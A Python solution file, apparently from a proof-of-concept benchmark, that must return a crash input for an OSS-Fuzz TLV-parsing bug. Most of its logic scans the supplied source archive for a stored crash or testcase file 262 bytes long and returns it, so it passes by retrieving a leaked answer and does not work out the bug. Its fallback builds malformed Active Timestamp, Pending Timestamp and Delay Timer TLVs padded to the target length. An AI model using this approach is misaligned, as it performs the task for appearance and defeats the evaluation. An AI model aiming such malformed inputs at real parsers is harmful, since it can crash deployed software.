import os
import tarfile
import zipfile
from typing import Optional


class Solution:
    TARGET_LEN = 262
    MAX_CANDIDATE_SIZE = 8192

    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            data = self._find_in_dir(src_path)
            if data is not None:
                return data
            return self._default_poc()

        if tarfile.is_tarfile(src_path):
            try:
                data = self._find_in_tar(src_path)
                if data is not None:
                    return data
            except Exception:
                pass

        if zipfile.is_zipfile(src_path):
            try:
                data = self._find_in_zip(src_path)
                if data is not None:
                    return data
            except Exception:
                pass

        return self._default_poc()

    def _name_score(self, name: str) -> int:
        n = name.lower()
        score = 0

        if '385180600' in n:
            score += 200
        if 'oss-fuzz' in n:
            score += 120
        if 'clusterfuzz' in n:
            score += 100
        if 'testcase' in n:
            score += 90
        if 'crash' in n:
            score += 90
        if 'poc' in n:
            score += 120
        if 'dataset' in n:
            score += 100
        if 'tlv' in n:
            score += 60
        if 'fuzz' in n:
            score += 60
        if 'corpus' in n or 'inputs' in n or 'seeds' in n or 'testdata' in n:
            score += 40

        if n.endswith((
            '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh',
            '.py', '.java', '.js', '.ts',
            '.html', '.htm', '.xml', '.json',
            '.txt', '.md', '.rst',
            '.yml', '.yaml',
            '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.svg',
            '.pdf'
        )):
            score -= 150

        base = os.path.basename(n)
        if base in ('readme', 'license', 'copying', 'changelog'):
            score -= 150

        return score

    def _choose_best(self, candidates):
        best = None
        best_key = None
        target = self.TARGET_LEN

        for name, size, extra in candidates:
            if size <= 0 or size > self.MAX_CANDIDATE_SIZE:
                continue

            is_exact = int(size == target)
            size_diff = abs(size - target)
            name_score = self._name_score(name)

            key = (-is_exact, size_diff, -name_score)

            if best_key is None or key < best_key:
                best_key = key
                best = (name, size, extra)

        return best

    def _find_in_tar(self, path: str) -> Optional[bytes]:
        with tarfile.open(path, 'r:*') as tf:
            members = [
                m for m in tf.getmembers()
                if m.isreg() and 0 < m.size <= self.MAX_CANDIDATE_SIZE
            ]
            if not members:
                return None

            candidates = [(m.name, m.size, m) for m in members]
            best = self._choose_best(candidates)
            if best is None:
                return None

            _, _, member = best
            f = tf.extractfile(member)
            if f is None:
                return None
            data = f.read()
            if not isinstance(data, bytes):
                data = bytes(data)
            return data

    def _find_in_zip(self, path: str) -> Optional[bytes]:
        with zipfile.ZipFile(path, 'r') as zf:
            infos = zf.infolist()
            candidates = []
            for info in infos:
                name = info.filename
                size = info.file_size
                if name.endswith('/'):
                    continue
                if size <= 0 or size > self.MAX_CANDIDATE_SIZE:
                    continue
                candidates.append((name, size, info))

            best = self._choose_best(candidates)
            if best is None:
                return None

            _, _, info = best
            with zf.open(info, 'r') as f:
                data = f.read()
                if not isinstance(data, bytes):
                    data = bytes(data)
                return data

    def _find_in_dir(self, root: str) -> Optional[bytes]:
        candidates = []
        for dirpath, dirnames, filenames in os.walk(root):
            for fname in filenames:
                full = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(full)
                except OSError:
                    continue
                if size <= 0 or size > self.MAX_CANDIDATE_SIZE:
                    continue
                rel = os.path.relpath(full, root)
                candidates.append((rel, size, full))

        best = self._choose_best(candidates)
        if best is None:
            return None

        _, _, path = best
        try:
            with open(path, 'rb') as f:
                return f.read()
        except OSError:
            return None

    def _default_poc(self) -> bytes:
        target_len = self.TARGET_LEN
        data = bytearray()

        data += bytes([0x54, 0x00])          # Malformed Active Timestamp TLV (type 0x54, length 0)
        data += bytes([0x55, 0x01, 0x00])    # Malformed Pending Timestamp TLV (type 0x55, length 1)
        data += bytes([0x56, 0x01, 0x00])    # Malformed Delay Timer TLV (type 0x56, length 1)

        if len(data) < target_len:
            pad_len = target_len - len(data)
            pattern = b'\x00A'
            full_repeats = pad_len // len(pattern)
            remainder = pad_len % len(pattern)
            data += pattern * full_repeats + pattern[:remainder]
        elif len(data) > target_len:
            data = data[:target_len]

        return bytes(data)